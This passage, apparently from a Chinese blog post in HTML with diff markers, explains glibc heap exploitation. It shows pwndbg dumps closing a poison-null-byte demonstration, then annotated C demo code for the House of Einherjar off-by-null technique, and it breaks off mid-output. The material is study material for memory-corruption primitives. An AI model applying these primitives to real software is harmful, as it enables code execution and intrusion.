class="hljs-number">88</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6032b0</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603310</span> &#123;<br>  prev_size = <span class="hljs-number">96</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0x210</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x110</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p b2-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">19 = (uint8_t *) 0x603220 <span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们的b2也在原本b所在的位置上</p>
+<p>随后我们释放b1和c,程序会直接无视b2合并b1和c,因为c的pre_size为</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">801</span>,<br>  fd = <span class="hljs-number">0x6032b0</span>,<br>  bk = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603430</span> &#123;<br>  prev_size = <span class="hljs-number">800</span>,<br>  size = <span class="hljs-number">272</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603540</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133825</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br>fastbins<br><span class="hljs-number">0</span>x20: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x30: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x40: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x50: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x60: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x70: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x80: <span class="hljs-number">0</span>x0<br>unsortedbin<br>all: <span class="hljs-number">0x603110</span> —▸ <span class="hljs-number">0x6032b0</span> —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x603110</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603110</span><br><span class="hljs-number">0x603110</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000321</span><br><span class="hljs-number">0x603120</span>:       <span class="hljs-number">0</span>x000000<span class="hljs-number">00006032b0</span>      <span class="hljs-number">0</span>x00007ffff7dd1b78<br><span class="hljs-number">0x603130</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603140</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603150</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到程序将b1和c合并了,大小为0x321,此时我们申请d,就会导致d和b2的overlapping </p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">801</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1e88</span> &lt;main_arena+<span class="hljs-number">872</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1e88</span> &lt;main_arena+<span class="hljs-number">872</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603430</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">800</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603540</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133825</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br>pwndbg&gt; p d<span class="hljs-number">-0</span>x10<br>$<span class="hljs-number">36</span> = (uint8_t *) <span class="hljs-number">0x603110</span> <span class="hljs-string">&quot;&quot;</span><br>pwndbg&gt; p <span class="hljs-keyword">b2-0x10</span><br><span class="hljs-keyword"></span>$<span class="hljs-number">37</span> = (uint8_t *) <span class="hljs-number">0x603220</span> <span class="hljs-string">&quot;\020\001&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>此时b2的值为</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx b2-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x603220</span>:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000110</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000090</span><br><span class="hljs-number">0x603230</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603240</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603250</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603260</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们给d赋值,之后b2的值变成了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx b2-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x603220</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603230</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603240</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603250</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603260</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们的b2已经被修改了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk</p>
+<p>随后为了绕过check,程序将b+0x1f0的位置设为了0x200</p>
+<p>紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)</p>
+<p>随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被被放到b的部分,而b做了一个unlink,一分两半</p>
+<p>随后程序又malloc了b2(0x80),b2依旧是所属b的</p>
+<p>之后程序为了方便看效果,将b2填满了’B’</p>
+<p>最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了</p>
+<p>此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来</p>
+<p>构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” :)</p>
+<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="序-1"><a href="#序-1" class="headerlink" title="序"></a>序</h2><p>这个利用技术由Hiroki Matsukuma提出,具体内容可以看<a target="_blank" rel="noopener" href="https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606">链接</a></p>
+<p>这个技术也就是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址</p>
+<h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>同样的,我这里删了一点作者的话并加了注释</p>
+<p>作者的话:</p>
+<p>感谢st4g3r公布这个技术</p>
+<p>这个攻击技巧使用了off-by-one溢出漏洞，用一个 null字节来通过malloc控制指针</p>
+<p>并且这个技术比poision null byte更强，但是也有一个附加条件就是需要泄漏堆</p>
+<p>在ubuntu16.04 64bits上测试，可以在你有一个off-by-null漏洞时使用</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-type">uint8_t</span>* a;<br>        <span class="hljs-type">uint8_t</span>* b;<br>        <span class="hljs-type">uint8_t</span>* d;<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br>        a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br>    <span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br>    <span class="hljs-comment">// create a fake chunk</span><br>    <span class="hljs-comment">//我们可以在任意一个我们想要的地方来创建一个fake chunk,本例中我们将在栈上创建这个fake chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br>    <span class="hljs-comment">//当然，你可以在heap或者bss段任一个你知道地址的地方创建fake chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br>    <span class="hljs-comment">//我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br>    <span class="hljs-comment">//尽管有的时候我们可以在这儿使用unsafe unlink技术</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>    fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br>    fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br>    fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>    fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>    fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>    fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><br>    <br>        <span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment">         * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span><br><span class="hljs-comment">         * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>        b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    <span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>        <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">//这个技术通过覆盖chunk的size以及pre_inuse位来工作</span><br>    <span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>        a[real_a_size] = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-comment">//如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br>           <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br>    <span class="hljs-comment">//如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br>           <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br>    <span class="hljs-comment">// Write a fake prev_size to the end of a</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br>           <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>    *(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    <span class="hljs-comment">//修改fake chunk的size去反应b的新的prev_size</span><br>    <span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>    fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-comment">//free b，之后他就会和我们的fake chunk合并了</span><br>    <span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">//如果我们在free b之前分配另一个chunk,我们需要做两件事</span><br>    <span class="hljs-comment">//if we allocate another chunk before we free b we will need to</span><br>    <span class="hljs-comment">//do two things:</span><br><br>    <span class="hljs-comment">//1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内</span><br>    <span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br>    <span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br>    <br>    <span class="hljs-comment">//2)我们将需要在我们控制的地址写我们的fake chunk的size</span><br>    <span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br>    <span class="hljs-comment">//at the location we control.</span><br>    <br>    <span class="hljs-comment">//在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check</span><br>    <span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br>    <span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test.</span><br><br>    <span class="hljs-comment">//否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离</span><br>    <span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br>    <span class="hljs-comment">//wilderness</span><br><br>    <span class="hljs-comment">//现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Welcome <span class="hljs-keyword">to</span> House <span class="hljs-keyword">of</span> Einherjar!<br>Tested <span class="hljs-keyword">in</span> Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64</span>bit.<br>This technique can be used <span class="hljs-keyword">when</span> you have an <span class="hljs-keyword">off</span>-<span 